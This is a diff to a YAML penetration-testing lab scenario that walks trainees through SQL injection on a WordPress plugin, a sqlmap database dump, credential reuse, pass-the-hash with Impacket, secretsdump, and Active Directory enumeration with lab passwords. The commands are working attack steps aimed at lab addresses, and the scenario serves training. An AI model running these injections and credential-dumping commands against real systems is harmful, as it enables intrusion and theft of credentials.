@@ -198,8 +198,8 @@ msel:
 
               | Port | Service | Notes |
               |------|---------|-------|
+              | 22 | SSH | OpenSSH server |
               | 80 | HTTP | Apache web server |
-              | 3306 | MySQL | Database (may be filtered) |
 
               > **Next:** Let's explore that web application!
 
@@ -261,29 +261,30 @@ msel:
             title: "Test for SQL Injection"
             vm: kali
             content: |
-              ## Testing the Search Box
+              ## Testing for SQL Injection
 
-              Let's test if the search is vulnerable to SQL injection.
+              The page has two potential injection points:
+              1. The `search` parameter (search box)
+              2. The `employee_id` parameter (employee detail links)
 
-              ### The Classic Single Quote Test
+              Click on an employee name to see their details. Notice the URL changes to include `employee_id=1`.
 
-              ```bash
-              curl "http://172.16.0.100/employee-directory/?search='"
-              ```
+              ### Testing the employee_id Parameter
 
-              If you see an error or unexpected behavior, the input isn't sanitized!
-
-              ### Boolean-Based Test
+              This numeric field is easier to exploit:
 
               ```bash
-              # This should return ALL results (always true)
-              curl "http://172.16.0.100/employee-directory/?search=' OR '1'='1"
+              # Normal request - shows employee details
+              curl -s "http://172.16.0.100/?page_id=4&employee_id=1" | grep -i "john"
 
-              # This should return NOTHING (always false)
-              curl "http://172.16.0.100/employee-directory/?search=' AND '1'='2"
+              # Boolean test - should still show data (true condition)
+              curl -s "http://172.16.0.100/?page_id=4&employee_id=1 AND 1=1" | grep -i "john"
+
+              # Boolean test - should return nothing (false condition)
+              curl -s "http://172.16.0.100/?page_id=4&employee_id=1 AND 1=2" | grep -i "john"
               ```
 
-              > **If both behave differently, you've confirmed SQL injection!**
+              > **Different responses confirm SQL injection!**
 
           - id: step2_4
             title: "Extract Data with SQLMap"
@@ -296,21 +297,21 @@ msel:
               ### Step 1: Confirm the Vulnerability
 
               ```bash
-              sqlmap -u "http://172.16.0.100/employee-directory/?search=test" --batch
+              sqlmap -u "http://172.16.0.100/?page_id=4&employee_id=1" -p employee_id --batch
               ```
 
-              `--batch` accepts all default prompts automatically.
+              `-p employee_id` tells SQLMap which parameter to test.
 
               ### Step 2: List Databases
 
               ```bash
-              sqlmap -u "http://172.16.0.100/employee-directory/?search=test" --dbs --batch
+              sqlmap -u "http://172.16.0.100/?page_id=4&employee_id=1" -p employee_id --dbs --batch
               ```
 
               ### Step 3: List Tables
 
               ```bash
-              sqlmap -u "http://172.16.0.100/employee-directory/?search=test" -D wordpress --tables --batch
+              sqlmap -u "http://172.16.0.100/?page_id=4&employee_id=1" -p employee_id -D wordpress --tables --batch
               ```
 
               > Look for: `wp_acme_employees`
@@ -324,8 +325,8 @@ msel:
               Now dump the employee table:
 
               ```bash
-              sqlmap -u "http://172.16.0.100/employee-directory/?search=test" \
-                -D wordpress -T wp_acme_employees --dump --batch
+              sqlmap -u "http://172.16.0.100/?page_id=4&employee_id=1" \
+                -p employee_id -D wordpress -T wp_acme_employees --dump --batch
               ```
 
               ### 🎯 CRITICAL FINDING
@@ -491,37 +492,36 @@ msel:
               Format: `username:RID:LM_hash:NTLM_hash:::`
 
           - id: step4_3
-            title: "Pass-the-Hash Attack"
+            title: "Verify Domain Admin Access"
             vm: kali
             content: |
-              ## Using Hashes Without Cracking
+              ## Verifying Domain Admin Access
 
-              You don't need the plaintext password - the hash works directly!
+              ### ⚠️ Note About This Lab
 
-              ### Pass-the-Hash with Impacket
+              This lab uses **Samba 4 AD** (Linux-based), not Windows Server. Some tools won't work:
+              - `impacket-psexec` - Requires Windows Service Control Manager
+              - `impacket-wmiexec` - Requires Windows WMI
 
-              ```bash
-              # Replace <NTLM_HASH> with the actual hash
-              impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> \
-                Administrator@172.16.2.12
-              ```
-
-              ### Or Just Use the Password
-
-              Since we have the plaintext:
+              ### Verify Access via SMB
 
               ```bash
-              impacket-psexec 'Administrator:Adm1n2024!@172.16.2.12'
+              # List DC shares with Domain Admin
+              smbclient -L //172.16.2.12 -U 'Administrator%Adm1n2024!'
+
+              # Access SYSVOL (only Domain Admins can write here)
+              smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024!' -c 'ls'
               ```
 
-              ### Other Impacket Execution Methods
+              ### In a Real Windows AD
 
-              | Tool | Protocol | Stealth |
-              |------|----------|---------|
-              | psexec | SMB | Low (creates service) |
-              | wmiexec | WMI | Medium |
-              | atexec | Task Scheduler | High |
-              | smbexec | SMB | Medium |
+              You would use Pass-the-Hash:
+
+              ```bash
+              impacket-psexec -hashes aad3b435..:<NTLM_HASH> Administrator@<DC_IP>
+              ```
+
+              > **You now have Domain Admin access!**
 
       # ============================================
       # PHASE 5: POST-EXPLOITATION
@@ -535,31 +535,30 @@ msel:
             content: |
               ## Confirm Your Access
 
-              Let's verify we have Domain Admin on all systems.
+              Let's verify we have Domain Admin on all systems via SMB.
 
               ### Domain Controller
 
               ```bash
-              impacket-smbclient 'Administrator:Adm1n2024!@172.16.2.12'
+              smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024!' -c 'ls'
               ```
 
               ### File Server
 
               ```bash
-              impacket-smbclient 'Administrator:Adm1n2024!@172.16.2.10'
+              smbclient //172.16.2.10/sensitive -U 'Administrator%Adm1n2024!' -c 'ls'
               ```
 
-              ### Get a Shell on the DC
+              ### Alternative with Impacket
 
               ```bash
-              impacket-wmiexec 'Administrator:Adm1n2024!@172.16.2.12'
+              impacket-smbclient 'Administrator:Adm1n2024!@172.16.2.12'
+              # shares
+              # use sysvol
+              # ls
               ```
 
-              Then run:
-              ```
-              whoami
-              whoami /groups
-              ```
+              > **Full access confirmed!**
 
           - id: step5_2
             title: "Explore the Domain"
@@ -567,25 +566,29 @@ msel:
             content: |
               ## Domain Enumeration
 
-              From your shell on the DC, explore the domain:
+              Since this is Samba AD, we use LDAP or SMB to enumerate:
+
+              ### List Domain Users via LDAP
 
               ```bash
-              # List all domain users
-              net user /domain
-
-              # List Domain Admins
-              net group "Domain Admins" /domain
-
-              # List all computers
-              net group "Domain Computers" /domain
+              ldapsearch -x -H ldap://172.16.2.12 \
+                -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
+                -w 'Adm1n2024!' \
+                -b 'cn=Users,DC=acmewidgets,DC=local' \
+                '(objectClass=user)' sAMAccountName
               ```
 
-              ### Additional Recon with Impacket
+              ### Browse Domain Shares
 
               ```bash
-              # Remote registry access
-              impacket-reg 'Administrator:Adm1n2024!@172.16.2.12' query -keyName HKLM\\SOFTWARE
+              # SYSVOL contains Group Policy and scripts
+              smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024!' -c 'recurse; ls'
+
+              # NETLOGON for logon scripts
+              smbclient //172.16.2.12/netlogon -U 'Administrator%Adm1n2024!' -c 'ls'
               ```
+
+              > **In Windows AD**, you would use: `net user /domain`, `net group "Domain Admins" /domain`
 
           - id: step5_3
             title: "🏆 Mission Complete!"
@@ -598,22 +601,26 @@ msel:
               ```
               1. RECONNAISSANCE
                  └── nmap discovered WordPress at 172.16.0.100
+                     └── Ports 22 (SSH), 80 (HTTP) open
 
               2. SQL INJECTION
-                 └── Employee Directory vulnerable
-                     └── Extracted credentials:
-                         - svc_backup / Backup2024!
+                 └── Employee Directory (?page_id=4)
+                     └── SQLi in employee_id parameter
+                         └── Extracted credentials:
+                             - svc_backup / Backup2024!
 
               3. LATERAL MOVEMENT
-                 └── Credential reuse on file server
-                     └── Found passwords.txt
-                         └── Domain Admin: Adm1n2024!
+                 └── Credential reuse on file server (172.16.2.10)
+                     └── svc_backup → sensitive share
+                         └── Found passwords.txt
+                             └── Domain Admin: Adm1n2024!
 
               4. DOMAIN COMPROMISE
-                 └── Full admin access to:
-                     - dc01 (Domain Controller)
-                     - fileserver
-                     - All domain resources
+                 └── SMB access to DC01 SYSVOL
+                     └── Full admin access to:
+                         - dc01 (Domain Controller)
+                         - fileserver
+                         - All domain resources
               ```
 
               ## Defensive Lessons
@@ -647,10 +654,11 @@ events:
       Exploit SQL injection in the WordPress Employee Directory plugin.
 
       Access: http://172.16.0.100/?page_id=4
-      Search for: IT
 
-      The plugin has SQLi in the search parameter. Extract VPN credentials
-      from the wp_acme_employees table:
+      The plugin has SQLi in the employee_id parameter. Use sqlmap:
+        sqlmap -u "http://172.16.0.100/?page_id=4&employee_id=1" -p employee_id --dump -T wp_acme_employees --batch
+
+      Extract VPN credentials from the wp_acme_employees table:
         - jsmith / Summer2024
         - mwilliams / Welcome123
         - svc_backup / Backup2024!
@@ -693,21 +701,21 @@ events:
     delay_minutes: 60
     title: "Phase 5: Post-Exploitation"
     description: |
-      With Domain Admin credentials, demonstrate access to all internal systems
-      using Impacket tools:
+      With Domain Admin credentials, demonstrate access to all internal systems.
+
+      Note: This lab uses Samba 4 AD (Linux-based). psexec/wmiexec won't work.
+
+      Verify access via SMB:
 
       File Server (172.16.2.10):
-        impacket-smbclient 'Administrator:Adm1n2024!@172.16.2.10'
+        smbclient //172.16.2.10/sensitive -U 'Administrator%Adm1n2024!' -c 'ls'
 
       Domain Controller (172.16.2.12):
+        smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024!' -c 'ls'
+
+      Or with Impacket:
         impacket-smbclient 'Administrator:Adm1n2024!@172.16.2.12'
         impacket-secretsdump 'Administrator:Adm1n2024!@172.16.2.12'
-
-      Additional Impacket tools to explore:
-        impacket-psexec    - Remote command execution via SMB
-        impacket-wmiexec   - Remote command execution via WMI
-        impacket-atexec    - Remote command execution via Task Scheduler
-        impacket-reg       - Remote registry manipulation
 
       Document your attack chain for the after-action review.
 
